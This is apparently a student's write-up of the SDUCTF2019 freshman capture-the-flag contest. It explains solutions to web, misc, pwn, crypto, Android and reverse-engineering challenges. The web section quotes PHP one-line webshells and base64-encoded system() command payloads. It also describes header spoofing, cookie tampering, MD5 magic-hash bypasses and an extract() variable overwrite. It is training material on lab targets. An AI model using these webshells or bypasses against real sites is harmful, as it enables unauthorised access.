---
title: SDUCTF2019-wp
date: 2019-11-15 13:39:00
tags: [ctf]
categories: ctf
description:
password:
---





# <center>SDUCTF2019-WriteUp</center>



刚入门了ctf2周，便有新生赛玩，真好。



PS.刚准备写wp又放出来一题QAQ

！！！写wp一半又放出题目

说好的周六早上放题的，结果早上起来一脸懵逼



## <center>Web</center>



### 0x01 最简答的Web题



>  题目描述：flag就在html里面，右键点击查看源代码即可查看 



直接F12查看源码，找到flag

![](SDUCTF2019-wp\web1.jpg)



### 0x02 按钮点击

> 题目描述： 想方设法点击按钮 

进入页面一个灰色的按钮，F12查看源码

![](SDUCTF2019-wp\web2-1.jpg)

删除button标签里的disabled即可点击按钮

```html
<input style="width: 150px; height: 60px; font-size: 30px;" type="button" onclick="c()" value="flag" disabled="">
```

![](SDUCTF2019-wp\web2-3.jpg)

后面好奇，发现flag就在click2.js里，被base64加密过

![](SDUCTF2019-wp\web2-2.jpg)





### 0x03 量子波动速读

> 题目描述： 你会量子波动速读吗？ 

进入页面就一个按钮，点击查看，发现一闪而过的fakeflag

```html
<button onclick="window.location.href = 'flag_is_here.html'">
    点击查看flag
</button>
```

源码如上，输入`url/flag_is_here.html`发现就是刚才一闪而过的页面

利用burpsuite抓包即可，因为所有请求被burpsuite拦截，所以可以看到`/flag_is_here.html`但是页面上给的是fake ctf，明显不是flag，查看源码得到flag，我是直接用repeater发一个包获得Response。

![](SDUCTF2019-wp\web3.jpg)



### 0x04 芝麻开门

> 题目描述： 简单的提交，芝麻开门 

<img src="SDUCTF2019-wp\web4.jpg" style="zoom:50%;" />

直接复制题目的zhimakaimen进去，返回的是口令错误

![](SDUCTF2019-wp\web4-1.jpg)

查看burpsuite拦截的包，好像是因为他的输入框有长度限制，所以少了一个字母

![](SDUCTF2019-wp\web4-2.jpg)

利用burpsuite的repeater重新发一个完整的包，得到flag





### 0x05 Funny Button

> 题目描述： 有趣的按钮，你能点到吗？ 

即示例的题目，删除html的css或js都可以，甚至可以用tab键选中button按钮，点击去就是flag



### 0x06 曲奇

> 题目描述： 你喜欢吃曲奇饼干吗？ 

曲奇==cookies，直接查看网站cookies即可

![](SDUCTF2019-wp\web6.jpg)

flag即在内容里，注意flag要进行url解码





### 0x07 GET

> 题目描述： 你就是个没有感情的浏览器 

![](SDUCTF2019-wp\web7.jpg)

![](SDUCTF2019-wp\web7-2.jpg)

我是一个莫得感情的get机器



### 0x08 未来浏览器

> 题目描述：  小王正在追剧《亲爱的，热爱的》，电脑屏幕。。。。（谁帮我编个） 当他再次醒来。。。。。。。 

![](SDUCTF2019-wp\web8.jpg)

有题目已知，用burpsuite改http头属性`User-Agent`即可

```http
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/6666.6.6666.66 Safari/537.36
```

改后发包得到flag



### 0x09 POST

> 题目描述：  你就是一个没有感情的浏览器 

![](SDUCTF2019-wp\web9.jpg)

<img src="SDUCTF2019-wp\web9-2.jpg" style="zoom:50%;" />



我只是一个莫得感情的post机器

利用firefox插件HackBar发送post请求，或者用burpsuite也行




### 0x0a vim好用啊

> 题目描述：  小明同学用vim编辑主页的时候，实验室断电了！ 

![](SDUCTF2019-wp\web10.jpg)

由题目得知用vim时断电，用过vim的人都知道，当vim非正常退出时会创建一个保护的缓存文件，现在word也一样。

直接百度搜vim异常退出的备份文件，因为上次做过类似的，试试`index.php.bak`和`index.php~`没用，就百度了一下，得知备份文件格式为`.index.php.swp`，访问`url/.index.php.swp`下载文件得到`.index.php.swp`

![](SDUCTF2019-wp\web10-2.jpg)

得知flag在`url/vimvimvimvim.php`里，果然vim是最好的编辑器（狗头保命





### 0x0b 一句话木马

> 题目描述： 听说过**一句话木马**吗？
> 					听说过**中国菜刀**吗？
> 					听说过**中国蚁剑**吗？
> 					快去了解一下吧！！



![](SDUCTF2019-wp\web11.jpg)

看刀`<!--php eval(@$_POST["cmd"]);-->`就可知是一句话木马，对这个稍微了解一下，去github获取中国蚁剑即可

不过有一个坑，就是他默认访问是`index.php`，但是通过中国蚁剑连不上，回头看页面，发现在题目中有一个`shell.php`，于是尝试`url/shell.php`加上密码`cmd`，成功连上得到flag

![](SDUCTF2019-wp\web11-2.jpg)





### 0x0c 达拉崩吧	

> 题目描述：  达拉崩吧打怪小游戏 

![](SDUCTF2019-wp\web12.jpg)



进入页面是个小游戏，发现是hackergame2019原题嘤嘤嘤

原题wp： [https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E8%BE%BE%E6%8B%89%E5%B4%A9%E5%90%A7%E5%A4%A7%E5%86%92%E9%99%A9/README.md](https://github.com/ustclug/hackergame2019-writeups/blob/master/official/达拉崩吧大冒险/README.md) 

不过在买菜这里，有一个大整数溢出，后续会搞懂这个原理

![](SDUCTF2019-wp\web12-2.jpg)



<img src="SDUCTF2019-wp\web12-3.jpg" style="zoom:50%;" />



然后得到flag

![](SDUCTF2019-wp\web12-4.jpg)



### 0x0d HTTP头

> 题目描述： 你了解http头吗？ 

![](SDUCTF2019-wp\web13.jpg)

根据题目，直接查看http Response Headers

得到flag：`F1ag: flag{096b5778-cf23-4f03-8c45-2505b7670b89}`





### 0x0e robots

> 题目描述： 你听说过robots协议吗？
> 他可是每个机器人都需要遵守的协议啊！（笑话） 

由题目知，robots是一个限制爬虫的东西，直接访问`url/robots.txt`

```
User-agent: *
Disallow: /
Disallow: f1ag_1s_h3re.php
```

得到如上页面，访问`url/f1ag_1s_h3re.php`，得到flag





### 0x0f 你的IP不太对

> 题目描述：小伙计，你的IP不太对啊
> 这个网站可不是任何ip都能访问的

由题目可知，需要改ip成`111.111.111.111`访问，易知是XFF伪造

利用burpsuite抓包，在header里加上`X-Forwarded-For:111.111.111.111`即可，发送包，得到flag





### 0x10 登录

> 题目描述： 小王做了一个网站需要登录，但是验证貌似有点漏洞 

进入页面之后发现button是没有用的，F5刷新之后抓包，发现有一个cookie



![](SDUCTF2019-wp\web17-1.jpg)

尝试将Cookie改成`Cookie: Login=1`，发现成功得到flag在button上

![](SDUCTF2019-wp\web17-2.jpg)



### 0x11 破解md5

> 题目描述： md5是坚不可破的，是真的吗？ 

![](SDUCTF2019-wp\web18-1.jpg)

进入页面之后直接查看源码，如题直接百度搜索php MD5漏洞。

> 引自： https://blog.csdn.net/qq_19980431/article/details/83018232 

```php
<!-- 
    if (isset($_GET['a']) and isset($_GET['b'])) {
    if ($_GET['a'] != $_GET['b'])
    if (md5($_GET['a']) == md5($_GET['b']))
    die('Flag: '.$flag);
    else
    print 'Wrong.';
}
 -->
```



若要求满足上述条件则
那么要求name和password数值不同但是MD5相同，在这里可以利用绕过。
PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，那么PHP将会认为他们相同，都是0。 

> **以下值在md5加密后以0E开头：**
>
> - QNKCDZO
> - 240610708
> - s878926199a
> - s155964671a
> - s214587387a
> - s214587387a
>
> **以下值在sha1加密后以0E开头：**
>
> - sha1(‘aaroZmOk’)
> - sha1(‘aaK1STfY’)
> - sha1(‘aaO8zKZF’)
> - sha1(‘aa3OFF9m’)

直接传入`url/?a=QNKCDZO&b=240610708`，得到flag





### 0x12 php是最好的语言

> 题目描述： php是最好的语言? 

![](SDUCTF2019-wp\web19.jpg)

进入页面如上图，点击查看source.php

![](SDUCTF2019-wp\web19-2.jpg)

```php
<?php if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $flag="flag{this_is_flag}";
    $pass="";
    $thepassword_123="不告诉你";
    extract($_POST);
}
?>

<div>
    <p><?php if ($pass == $thepassword_123) { echo $flag;} else {echo "ha,你永远猜不到";} ?></p>
</div>

```

得到php源码，百度php extract函数，得知`extract()`有个变量覆盖漏洞

由php源码得知所有变量名，直接出入post参数`pass=&thepassword_123=`

得到flag

![](SDUCTF2019-wp\web19-3.jpg)







### 0x13 一句话木马2

> 题目描述： 在现实世界中，最原始的一句话木马往往会被waf给拦截，所以在使用过程中一般会进行编码或者加密。
> 这里使用最简单的编码，你能成功利用这个后门吗？ 

进入网页查看源码

![](SDUCTF2019-wp\web20.jpg)

百度得知waf是` Web Application Firewall `的简称。

这题应该是要绕过waf，进行获取webshell

由`<!--php @eval(@base64_decode($_POST["cmd"])); -->`和题目shell.php得知：实在shell.php执行一句话木马

```

system('ls');
base64>>>c3lzdGVtKCdscycpOw==
system('cat ffffllllaaaagggg')
base64>>>c3lzdGVtKCdjYXQgZmZmZmxsbGxhYWFhZ2dnZycpOw==

```



注：别在网页中解base64，不同网页也许会将字符串先url编码或者Unicode编码在进行base64加密，直接用burpsuite带的base64encode，然后发包即可

![](SDUCTF2019-wp\web20-1.jpg)

得知flag在同目录下的ffffllllaaaagggg里

![](SDUCTF2019-wp\web20-2.jpg)

得到flag



### 0x14 拼手速

> 题目描述： 你就是个没有感情的浏览器，但是你的手速够快吗？ 

进入页面

![](SDUCTF2019-wp\web21.jpg)

如题，提交get请求`url/?first=cyber`

![](SDUCTF2019-wp\web21-2.jpg)

如题，提交post请求`sceond=ans`（因为计算式每次都会变，所以我这用ans替代，不过也没关系，得到如下页面

![](SDUCTF2019-wp\web21-3.jpg)

因为每次刷新get页面是计算式都会变，所以我想到了用python的requests的库，脚本如下

```python
import requests
import re

url = "http://url/?first=cyber"
reflag = '\d\*\d\+\d\*\d'

def qa():
	r1 = requests.get(url)
	print(r1.text)
	r2 = re.search(reflag,r1.text)
	print(r2.group())
	ans = eval(r2.group())
	print(ans)
	ck = str(r1.cookies)
	pd = re.search('PHPSESSID=.* for',ck)
	pd = pd.group().split(' for')[0]
	print(pd)
	header = {
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"Cookie":pd,
	"Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
	"Accept-Encoding": "gzip, deflate"
	}
	data = {"second":ans}
	print(header)
	r4 =requests.post(url,headers=header,data=data)
	print(r4)
	print(r4.text)#flag
	return r4
	
aa = qa()
#print(aa)
```



跑出来结果如下，得到flag

![](SDUCTF2019-wp\web21-4.jpg)





## <center>Misc</center>



### 0x01 Gif

> 题目描述： Gif你眼神够快吗？ 



用StegSolve.jar 打开目标gif，即可逐帧查看，一共六帧，4帧都是flag需要自己拼接。

拼接完得到flag`SDUCTF{Gif_is_very_interesting}`





### 0x02 PDF

> 题目描述： pdf里面藏了啥？ 

跟攻防世界的一题misc一样，随便找个网站将pdf转doc，然后把图片拖开flag就藏在下面。

或者用一些pdf编辑器也做的到。

![](SDUCTF2019-wp\misc2.jpg)





### 0x03 今晚月色美吗

> 题目描述： 小王同学在路上走路，突然发现小朱同学发了一条朋友圈，配图是美美的月亮。于是小王同学心血来潮，掏出手机也拍了一张照片。你觉得月亮有什么奇怪的地方吗？ 

用StegSolve查看，原以为是加密，，没想到是藏在不同色差层。

![](SDUCTF2019-wp\misc3.jpg)





### 0x04 聋子听声音

> 题目描述：



我这边用的是Audacity，据说AU也可以查看，根据题目描述，音频应该不是隐写，而是藏在频谱图里

查看频谱图就可得flag

![](SDUCTF2019-wp\misc4.jpg)





### 0x05 二进制

>  题目描述：看二进制你能看出个什么花样来？ 

原本没有思路的，将文件扔进binwalk和foremost跑没跑出东西，用`less`，`more`没跑出来，最后自暴自弃用`cat`一试，flag就出来了，我还以为有什么隐写emmmmmmmmmm

结果是一堆0加上flag

另一种办法，用010editor打开，直接搜索flag，得到flag

![](SDUCTF2019-wp\misc5.jpg)







### 0x06 奇怪的压缩文件

> 题目描述： eva说她给tom发了一张二维码，但是Tom接收文件后觉得不太对劲。 

打开附件PIC.zip，发现里面有四个压缩文件，发现解压不了。扔binwalk跑一波发现是jpeg，直接改后缀得到jpg图片。

四个压缩文件分别是QRcode四等分，用画图把他们拼一起，获得一张完整的二维码，扫码得到flag。

![](SDUCTF2019-wp\misc6.jpg)









## <center>PWN</center>



### 0x01 Simple nc

> 题目描述： 你会使用nc命令吗?
> 					可能是全球最简单的pwn题目 



![](SDUCTF2019-wp\pwn1.jpg)

虽然pwn还没入门，不过这确实是最简单得pwn。

熟悉nc即netcat命令即可，`netcat ctf.sec.sdunet.cn 38849`直接连上通过`ls,cat`命令读取flag



### 0x02 猜拳

> 题目描述： 猜拳，你能赢过机器人吗？ 

又是没有思路的pwn，上网搜索得知python有个pwn库可以计算随机数种子，既然是猜，我就自己找一波规律。

![](SDUCTF2019-wp\pwn2-sjb.jpg)

```
robot: 		bsj sjb jbs
I can win: 	jbs bsj sjb
```

找规律得知对面出拳是一个循环，自己手动解一波得到flag







## <center>Crypto</center>



### 0x01 Base

> 题目描述：[https://baike.baidu.com/item/贝斯/]
>
> [奇怪的链接](https://www.google.com/search?q=ZmxhZ3tiYXNlNjRfaXNfbm90X2FuX2VuY3J5cHRpb25fbWV0aG9kfQ)

题目直接给了两个链接，不过第二个如下

```
ZmxhZ3tiYXNlNjRfaXNfbm90X2FuX2VuY3J5cHRpb25fbWV0aG9kfQ
```

直接扔base64去解码，得到flag：`flag{base64_is_not_an_encryption_method}`



### 0x02 诡异的数字

> 题目描述：摩同学做ctf到深夜，点开这道题却发现网安实验室里的灯突然有规律的时暗时亮，十分诡异。难道这代表着什么？
> 他用颤抖的双手记下了下面这段文字。你能发现其中的奥秘吗？
> 11 111 010 000 0 11111 00 000 11111
> 00 10 1 0 010 0 000 1 00 10 110
>
> flag格式为sductf{xxxxxxxxxx}

既然是摩同学，那么直接放莫斯解码即可，字符串利用python脚本的`str.replae()`方法替换成`.-`即可，即1对应`-`，2对应`.`，解得flag。



### 0x03 九宫格

> 题目描述：无论是搜狗输入法还是百度输入法还是QQ输入法还是讯飞输入法还是谷歌输入法还是..........都有9宫格，所以这个题目炒鸡简单
>
> 7426366432983
> 解出来的明文赋值给x
>
> flag为 flag{ md5(x+md5(x,16), 32) }
> (结果没有空格，x+ 表示的是x与另一个字符串进行拼接）



一串数字通过经典的九宫格打出来是`山东大学`四个字

然后通过python的`hashlib.md5()`就可以算出flag

md5的16位百度得知是截取32位md5中间的16位

```python
import hashlib
s = "山东大学"
mobj = hashlib.md5(s.encode('utf-8')).hexdigest()[8:24]
ans = hashlib.md5(str(s+mobj).encode('utf-8')).hexdigest()
```

```python
>>> import hashlib
>>> s = "山东大学"
>>> mobj = hashlib.md5(s.encode('utf-8')).hexdigest()[8:24]
>>> mobj
'f09383b061bb3c9f'
>>> ans = hashlib.md5(str(s+mobj).encode('utf-8')).hexdigest()
>>> ans
'ecf506190946c4e8d06d53e14191329e'
```



### 0x04 键盘追踪

> 题目描述：键盘是个画板，如果你的键盘有灯光应该会简单点
>
> rfsdsz tfvbhy ijnm ijnm tfvbhy wsxdcft vgyhujm hjuygbn
>
> 还原出明文后请自行拼接flag{}

之前在成都大学的ctf比赛中看过键盘密码，看题目描述应该是按键盘位置画出字母来，但是我比划出`olloWMe`后七个字母，硬是没看懂第一个字符是啥，然后将那些字符扔去百度，搜索得到的时`FollowMe`，尝试一波，果然是flag。

（至今为止我都不知道第一个为啥时F





### 0x05 宇宙终极问题

> 题目描述：Do you know The Answer to the Ultimate Question of Life, The Universe, and Everything?
>
> Give me 3 integers, x, y, and z, such that **x^3 + y^3 + z^3 = 42**
>
> 得到x、y、z后请把它们乘起来，然后包裹上flag{}

直接百度得到解如下，扔进python跑一波大数乘法

```python
>>> x = -80538738812075974
>>> y = 80435758145817515
>>> z = 12602123297335631
>>> x**3+y**3+z**3
42
>>> x*y*z
-81639006040518590050493906720365515701570561538910
```





### 0x06 秘密报文

> 题目描述：在第一次世界大战期间，法国陆军捕获到一份秘密报文，交给中尉Georges Painvin尝试破解。
>
> 报文内容如下：
> XX DF GG AF XD XF AF XD XF AF AG DD AF GF DX XF XD
>
> 解密之后请自行拼接flag{}提交

我记得之前做题时有看见过类似密码，但是忘了是啥。

最明显的，先把中尉名字`Georges Painvin`百度一波，得知时`ADFGVX密码`对照密码表，解得flag：`flag{youarearealhacker}`

![图源自百度百科](SDUCTF2019-wp\crypto6.jpg)







## <center>Mobile</center>





### 0x01 apk1

>  题目描述：用着安卓手机，你懂apk吗？ 

通过工具`d2j-dex2jar`和`jd-gui`两者逆向apk得到flag

![](SDUCTF2019-wp\mobile-apk1.jpg)

### 0x02 apk2

> 题目描述： 你真的懂apk吗？ 

通过工具`d2j-dex2jar`和`jd-gui`两者逆向apk得到flag

![](SDUCTF2019-wp\mobile-apk2.jpg)



然后看代码可知是对字符串进行一个排序，将字符串里的第i位放到s2[i]位，得到结果

直接写一个python脚本得到flag



## <center>Reverse</center>



### 0x01 Java jar

> 题目描述： 都是java程序员，互相偷个代码谁不会呀！ 

![](SDUCTF2019-wp\re1-java.jpg)

下载附件得到jar包，直接解压得到文件，打开`main.class`，看到flag明文就在main.class里



### 0x02 C#

> 题目描述： C#简直跟java一样，会java就自然上手c#了。 

下载附件得到sductf.exe，拖入辣个女人ida进行逆向，直接得到flag

![](SDUCTF2019-wp\re2-sductf.jpg)







### 0x03 Rust

> 题目描述： 你听说过Rust语言吗？
> 					据说它非常安全。 



没接触过rust语言，不过据说逆向不知道程序逆向结构时，最好自己写个程序HelloWorld进行逆向一波看结构，但是我偷懒了。

直接百度搜索：rust逆向

 https://www.anquanke.com/post/id/169970 

 https://blog.csdn.net/qq_33438733/article/details/81138573 

看完链接之后打开ida，还需要64bit的辣个女人。

乱逛发现有一个字符串，但是解码出来是一个奇怪的东西，继续找主函数main

![](SDUCTF2019-wp\re3-rust-2.jpg)



主函数入口

![](SDUCTF2019-wp\re3-rust-3.jpg)



点进第一个函数查看流程



![](SDUCTF2019-wp\re3-rust-4.jpg)



既然是逆向，那就从尾部往后面看，果然看到一个判断和一个类似flag的字符串`c2R1Y3Rme0lfbDB2ZV9ydXN0X2hoaGh9`，base64解码得到flag：`sductf{I_l0ve_rust_hhhh}`



![](SDUCTF2019-wp\re3-rust-5.jpg)











# TODO List



web：http头，robots，你的ip不太对(XFF)，登陆(Cookie:login=1)，破解MD5(php function fail)，php是最好的语言(extract()函数变量覆盖)，一句话木马2(cmd=c3lzdGVtKCdjYXQgZmZmZmxsbGxhYWFhZ2dnZycpOw==)，拼手速(python requests)









































